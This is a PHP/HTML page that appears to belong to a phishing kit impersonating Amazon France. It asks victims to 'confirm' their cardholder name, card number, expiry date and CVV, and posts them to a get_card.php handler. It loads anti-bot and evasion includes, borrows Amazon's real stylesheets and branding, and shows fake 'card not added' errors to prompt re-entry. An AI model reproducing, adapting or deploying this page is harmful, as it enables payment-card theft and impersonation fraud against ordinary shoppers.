<?php
session_start();
include('../ANTIBOTS/antibots.php');
include('../PREVENTS/anti1.php');
include('../PREVENTS/anti2.php');
include('../PREVENTS/anti3.php');
include('../PREVENTS/anti4.php');
include('../PREVENTS/anti5.php');
include('../PREVENTS/anti6.php');
include('../PREVENTS/anti7.php');
include('../PREVENTS/anti8.php');

?>


<html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember a-ws" data-19ax5a9jf="dingo" data-aui-build-date="3.20.8-2021-02-19"><head>
    <meta name="viewport" content="width=device-width"/>

<script>
function formatString(e) {
  var inputChar = String.fromCharCode(event.keyCode);
  var code = event.keyCode;
  var allowedKeys = [8];
  if (allowedKeys.indexOf(code) !== -1) {
    return;
  }

  event.target.value = event.target.value.replace(
    /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
  ).replace(
    /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
  ).replace(
    /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
  ).replace(
    /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
  ).replace(
    /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
  ).replace(
    /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
  ).replace(
    /\/\//g, '/' // Prevent entering more than 1 `/`
  );
}

</script>
    <title dir="ltr">Confirmez vos informations de paiement</title>


      
<link rel="icon" href="../RESSOURCES/icon.png"/>
      
        <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/61zcRmYWpgL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI&amp;zSPFUKZg#fr.not-trident">
<link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,41RVmSDdlvL.css_.css?AUIClients/AuthenticationPortalAssets">
<link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/11G4j12sgkL.css?AUIClients/CVFAssets">

      
    
 
</head><body><div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none auth-navbar">
        





<div class="a-section a-spacing-medium a-text-center">
  
    

    
      


<a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

  
  
    
    
      <i class="a-icon a-icon-domain-fr a-icon-domain" role="presentation"></i>
    
  
</a>

    
  
</div>


      </div>
      <div class="a-section a-spacing-base auth-pagelet-container">
<div class="a-section">



        
          
          
            <div id="authportal-main-section" class="a-section">
              





<div class="a-section a-spacing-base auth-pagelet-container">
  
    
    </div></div>
    
  
</div>

<div class="a-section auth-pagelet-container">
  



<?php 

if(strpos($_SERVER['REQUEST_URI'], "error=true"))
{
  

echo'<div class="a-section a-spacing-base auth-pagelet-container">
<div class="a-section">

<div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Un problème est survenu</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
      <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
        
          <li><span class="a-list-item">
            Veuillez vérifier votre saisie
          </span></li>    
      </ul>
          </div></div> </div>
</div>  
        
          
          
            <div id="authportal-main-section" class="a-section">
              





<div class="a-section a-spacing-base auth-pagelet-container">
  
    
    </div></div>
    
  
</div>';
}
else{
if(strpos($_SERVER['REQUEST_URI'], "dead=true"))
{
  

echo'<div class="a-section a-spacing-base auth-pagelet-container">
<div class="a-section">

<div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Carte non ajoutée</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
      <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
        
          <li><span class="a-list-item">
           Veuiller vérifier les donnés saisis 
          </span></li>    
      </ul>
          </div></div> </div>
</div>  
        
          
          
            <div id="authportal-main-section" class="a-section">
              





<div class="a-section a-spacing-base auth-pagelet-container">
  
    
    </div></div>
    
  
</div>';
}


}


  
 ?>   





<div class="a-section a-spacing-base">
  <div class="a-section">

    <form name="signIn" method="post" novalidate="" action="get_card.php?<?php echo uniqid();?>" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="MVAqFszy">
      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <p class="a-spacing-small" style="font-size: 15px;">
            Confirmez vos informations de paiement :
          </p>


<center><img style=" width: 100px;margin-top: 10px;" src="../RESSOURCES/gateway.png"></center>
<div class="a-row a-spacing-base" style="margin-top: 10px;">
            <label for="ap_email" class="a-form-label">
              Nom sur la carte :
            </label>
            
            
              
              
                
              
            
            <input type="first_name" maxlength="128" id="first_name" name="cardholder" tabindex="1" value="<?php echo $_SESSION['nom']; ?>" class="a-input-text a-span12 auth-required-field"></div>





            
            <div class="a-row a-spacing-base">
            <label for="ap_email" class="a-form-label">
              Numéro de carte :
            </label>

            <input type="cardnumber" maxlength="16" id="cardnumber" name="cardnumber" tabindex="1" class="a-input-text a-span12 auth-required-field" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));"></div>

             <div class="a-row a-spacing-base">
            <label for="ap_email" class="a-form-label">
              Date d'expiration :
            </label>

            <input type="expiration" maxlength="5" id="expiration" name="cardexpiration" tabindex="1" class="a-input-text a-span12 auth-required-field" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" onkeyup="formatString(event);"></div>


             <div class="a-row a-spacing-base">
            <label for="ap_email" class="a-form-label">
             CVV :
            </label>

            <input type="cvv" maxlength="4" id="cvv" name="cardcvv" tabindex="1" class="a-input-text a-span12 auth-required-field" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));"></div>

<span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce" name="continuer"><span id="continue-announce" class="a-button-text" aria-hidden="true">
              Continuer
            </span></span></span>





<br>
<br>


          
          
          

          
          

          

          

          

          






          




  
  
  
    
      
      
      
        
             
          
        </div></div>
      </div>
  </form>
  </div>
  
    
    
      
        
        
        
      
    
  
</div>

  
  

</div>
            </div>
          
        
      </div>

      
      <div id="right-2">
      </div>

      <div class="a-section a-spacing-top-extra-large auth-footer">
        



<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>

  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Conditions d'utilisation
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Protection de vos informations personnelles
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Aide
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Cookies
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <span class="auth-footer-seperator"></span>
  

  
</div>




<div class="a-section a-spacing-none a-text-center">
  





<span class="a-size-mini a-color-secondary">
  © 1996-<?php echo date(' Y ');?>, Amazon.com, Inc. ou ses filiales.
</span>

</div>

      </div>
    </div>

    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>

    



</div>


</body></html>